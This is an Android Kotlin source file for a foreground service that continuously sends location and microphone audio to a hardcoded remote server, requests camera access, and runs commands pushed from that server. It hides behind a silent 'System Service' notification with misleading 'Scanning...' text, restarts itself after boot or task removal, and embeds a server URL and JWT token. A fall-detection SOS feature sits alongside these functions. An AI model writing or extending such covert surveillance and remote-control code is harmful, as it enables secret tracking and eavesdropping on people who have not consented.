package com.sentinel.host.service

import android.Manifest
import android.app.AlarmManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.location.LocationManager
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.sentinel.host.R
import com.sentinel.host.domain.model.ConnectionState
import com.sentinel.host.domain.usecase.ConnectUseCase
import com.sentinel.host.worker.SentinelWatchdogWorker
import dagger.hilt.android.AndroidEntryPoint
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import kotlinx.coroutines.CoroutineExceptionHandler
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import javax.inject.Inject

/**
 * Foreground service that keeps connection, location, and audio streaming alive.
 * Resilience: Dynamic foreground service types (Android 14+ background launch compatible),
 * START_STICKY auto-restart, and onTaskRemoved AlarmManager instant fallback watchdog.
 */
@AndroidEntryPoint
class SentinelForegroundService : Service() {

    companion object {
        private const val TAG = "Sentinel:FgService"
        private const val CHANNEL_ID = "sentinel_fg_channel"
        private const val NOTIFICATION_ID = 1001

        const val SERVER_URL = "wss://project-sentinel-rwt4.onrender.com/ws"
        const val JWT_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXZpY2VfaWQiOiJIT1NULTAwMSIsImlzcyI6InByb2plY3Qtc2VudGluZWwiLCJzdWIiOiJIT1NULTAwMSIsImV4cCI6MTgxNTg5MDcwMywiaWF0IjoxNzg0MzU0NzAzfQ.l_yJzhLSY0Kuhudn6-5W81pyv77NBZkDsZVdXgWKeSA"

        const val EXTRA_FROM_BOOT = "extra_from_boot"

        fun Start(context: Context, isFromBoot: Boolean = false) {
            val intent = Intent(context, SentinelForegroundService::class.java).apply {
                putExtra(EXTRA_FROM_BOOT, isFromBoot)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }
    }

    @Inject lateinit var connectUseCase: ConnectUseCase
    @Inject lateinit var connectionSupervisor: ConnectionSupervisor
    @Inject lateinit var locationStreamer: LocationStreamer
    @Inject lateinit var audioStreamer: AudioStreamer
    @Inject lateinit var commandProcessor: CommandProcessor
    @Inject lateinit var webSocketDataSource: com.sentinel.host.data.remote.websocket.WebSocketDataSource
    @Inject lateinit var fallDetector: com.sentinel.host.data.device.FallDetector

    private val exceptionHandler = CoroutineExceptionHandler { _, throwable ->
        Log.e(TAG, "Unhandled exception in Sentinel service scope: ${throwable.message}", throwable)
    }

    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.Main + exceptionHandler)

    private val locationReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            if (intent?.action == LocationManager.PROVIDERS_CHANGED_ACTION) {
                checkPermissionsAndSettings()
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        Log.i(TAG, "SentinelForegroundService created")
        createNotificationChannel()
        registerReceiver(locationReceiver, IntentFilter(LocationManager.PROVIDERS_CHANGED_ACTION))
        SentinelWatchdogWorker.schedule(this)

        // Start automated fall detection & SOS trigger
        fallDetector.start()
        fallDetector.onEmergencyTriggered = { peakG ->
            Log.e(TAG, "EMERGENCY: Fall detected with peak $peakG g!")
            val lastLoc = locationStreamer.lastLocation
            val sosJson = org.json.JSONObject().apply {
                put("type", com.sentinel.shared.protocol.MessageType.EMERGENCY_SOS)
                put("version", 1)
                put("timestamp", System.currentTimeMillis() / 1000)
                val data = org.json.JSONObject().apply {
                    put("triggerReason", "FALL_DETECTED")
                    put("impactGForce", peakG.toDouble())
                    put("latitude", lastLoc?.latitude ?: 0.0)
                    put("longitude", lastLoc?.longitude ?: 0.0)
                    put("accuracy", lastLoc?.accuracy?.toDouble() ?: 0.0)
                    put("battery", lastLoc?.battery ?: 0)
                    put("timestamp", System.currentTimeMillis() / 1000)
                }
                put("data", data)
            }
            serviceScope.launch {
                try {
                    webSocketDataSource.sendText(sosJson.toString())
                    Log.i(TAG, "Emergency SOS broadcasted successfully")
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to broadcast emergency SOS: ${e.message}")
                }
            }
        }

        serviceScope.launch {
            webSocketDataSource.textMessages.collect { rawText ->
                commandProcessor.processCommand(rawText) { resultJson ->
                    webSocketDataSource.sendText(resultJson)
                }
            }
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val isFromBoot = intent?.getBooleanExtra(EXTRA_FROM_BOOT, false) == true
        Log.i(TAG, "SentinelForegroundService starting (flags=$flags, startId=$startId, isFromBoot=$isFromBoot)")

        val notification = buildNotification("Scanning ...")

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            // Always try LOCATION | MICROPHONE first — even on boot.
            // Doze whitelist exemption allows this on most devices.
            // Falls back to LOCATION-only if the OS blocks microphone from background.
            val fullType = ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE or
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA

            try {
                startForeground(NOTIFICATION_ID, notification, fullType)
                Log.i(TAG, "startForeground succeeded with LOCATION|MICROPHONE|CAMERA")
            } catch (e: Exception) {
                Log.w(TAG, "LOCATION|MICROPHONE|CAMERA failed (${e.message}) — trying LOCATION|MICROPHONE")
                try {
                    startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE)
                    Log.i(TAG, "startForeground succeeded with LOCATION|MICROPHONE")
                } catch (fallbackEx: Exception) {
                    Log.e(TAG, "LOCATION|MICROPHONE fallback also failed: ${fallbackEx.message}", fallbackEx)
                    startForeground(NOTIFICATION_ID, notification)
                }
            }
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }

        checkPermissionsAndSettings()

        // Start connection supervisor
        connectionSupervisor.start()
        registerNetworkCallback()

        startAutoRepairConnection()

        // Monitor state for notification updates + dynamic microphone elevation on boot
        serviceScope.launch {
            connectionSupervisor.state.collect { state ->
                val text = when (state) {
                    is ConnectionState.Ready -> {
                        elevateForegroundServiceType()
                        "System Nominal"
                    }
                    is ConnectionState.Reconnecting -> "Syncing..."
                    is ConnectionState.Error -> "Syncing..."
                    is ConnectionState.Disconnected -> "Syncing..."
                    else -> "Syncing..."
                }
                updateNotification(text)
            }
        }

        return START_STICKY
    }

    private var autoRepairJob: Job? = null

    private fun startAutoRepairConnection() {
        autoRepairJob?.cancel()
        autoRepairJob = serviceScope.launch {
            var attempt = 0
            while (isActive) {
                try {
                    val isConnected = connectionSupervisor.state.value is ConnectionState.Ready
                    if (!isConnected) {
                        Log.i(TAG, "Auto-repair: Attempting silent connection to $SERVER_URL (attempt ${attempt + 1})")
                        val result = connectUseCase.execute(SERVER_URL, JWT_TOKEN)
                        if (result.isSuccess) {
                            Log.i(TAG, "Auto-repair successful: Connected and registered!")
                            attempt = 0
                        } else {
                            attempt++
                        }
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "Auto-repair attempt failed: ${e.message}")
                    attempt++
                }

                val backoffDelay = (2000L * (1 shl attempt.coerceAtMost(5))).coerceAtMost(30000L)
                delay(backoffDelay)
            }
        }
    }

    private fun registerNetworkCallback() {
        try {
            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
            val request = NetworkRequest.Builder()
                .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                .build()

            cm?.registerNetworkCallback(request, object : ConnectivityManager.NetworkCallback() {
                override fun onAvailable(network: Network) {
                    Log.i(TAG, "Network available — triggering instant connection auto-repair")
                    startAutoRepairConnection()
                }
            })
        } catch (e: Exception) {
            Log.w(TAG, "Could not register network callback: ${e.message}")
        }
    }

    /**
     * Dynamically elevates the foreground service to include MICROPHONE type.
     * Called after WebSocket connection is established (service is already in foreground).
     * After elevation succeeds, restarts the audio streamer so AudioRecord is
     * recreated with actual microphone hardware access.
     */
    private fun elevateForegroundServiceType() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            val hasMic = ContextCompat.checkSelfPermission(
                this, Manifest.permission.RECORD_AUDIO
            ) == PackageManager.PERMISSION_GRANTED

            if (!hasMic) {
                Log.w(TAG, "Skipping microphone elevation — RECORD_AUDIO permission not granted")
                return
            }

            val targetType = ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE or
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
            try {
                val notification = buildNotification("System Nominal")
                startForeground(NOTIFICATION_ID, notification, targetType)
                Log.i(TAG, "Foreground service elevated to LOCATION|MICROPHONE|CAMERA")

                // Restart audio streamer so AudioRecord is recreated with mic access.
                // The old AudioRecord (created before MICROPHONE FGS type) returns zeros.
                Log.i(TAG, "Restarting audio streamer after microphone elevation")
                audioStreamer.stop()
                audioStreamer.hasPermission = true
                audioStreamer.start()
            } catch (e: Exception) {
                Log.w(TAG, "Microphone elevation failed (expected on boot): ${e.message}")
                // Service continues with LOCATION type — audio will start when user opens app
            }
        }
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        Log.w(TAG, "Task removed from recent apps — scheduling instant AlarmManager watchdog restart")
        val restartServiceIntent = Intent(applicationContext, SentinelForegroundService::class.java).apply {
            setPackage(packageName)
        }
        val restartServicePendingIntent = PendingIntent.getService(
            applicationContext, 1, restartServiceIntent,
            PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
        )
        val alarmManager = getSystemService(Context.ALARM_SERVICE) as? AlarmManager
        alarmManager?.set(
            AlarmManager.RTC_WAKEUP,
            System.currentTimeMillis() + 1000,
            restartServicePendingIntent
        )
        super.onTaskRemoved(rootIntent)
    }

    override fun onDestroy() {
        Log.i(TAG, "SentinelForegroundService destroyed")
        try {
            unregisterReceiver(locationReceiver)
        } catch (e: Exception) {
            // Ignore
        }
        fallDetector.stop()
        connectionSupervisor.stop()
        serviceScope.cancel()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun createNotificationChannel() {
        val channel = NotificationChannel(
            CHANNEL_ID,
            "System Sync",
            NotificationManager.IMPORTANCE_MIN
        ).apply {
            description = "System Synchronization"
            setShowBadge(false)
        }
        val nm = getSystemService(NotificationManager::class.java)
        nm.createNotificationChannel(channel)
    }

    private fun buildNotification(text: String, isAlert: Boolean = false): Notification {
        val launchIntent = packageManager.getLaunchIntentForPackage(packageName)
        val pendingIntent = PendingIntent.getActivity(
            this, 0, launchIntent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText(text)
            .setSmallIcon(R.drawable.ic_silent)
            .setOngoing(true)
            .setSilent(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setContentIntent(pendingIntent)
            .build()
    }

    private fun updateNotification(text: String, isAlert: Boolean = false) {
        val nm = getSystemService(NotificationManager::class.java)
        nm.notify(NOTIFICATION_ID, buildNotification(text, isAlert))
    }

    private fun checkPermissionsAndSettings() {
        val hasLoc = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
        val hasMic = ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED
        val hasStorage = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            android.os.Environment.isExternalStorageManager()
        } else {
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
        }
        val isGpsEnabled = locationStreamer.isLocationEnabled

        locationStreamer.hasPermission = hasLoc
        audioStreamer.hasPermission = hasMic

        if (!hasLoc || !isGpsEnabled || !hasMic || !hasStorage) {
            val reason = when {
                !hasLoc -> "Location permission missing"
                !isGpsEnabled -> "Location (GPS) is OFF"
                !hasMic -> "Microphone permission missing"
                !hasStorage -> "Storage access required"
                else -> ""
            }
            Log.w(TAG, "Requirement missing: $reason")
            updateNotification("Action Required: $reason", isAlert = true)
        } else {
            val text = when (connectionSupervisor.state.value) {
                is ConnectionState.Ready -> "Scan Completed"
                is ConnectionState.Reconnecting -> "Scanning..."
                is ConnectionState.Error -> "Error: ${(connectionSupervisor.state.value as ConnectionState.Error).message}"
                is ConnectionState.Disconnected -> "Scan failed"
                else -> "Scanning..."
            }
            updateNotification(text, isAlert = false)
        }
    }
}
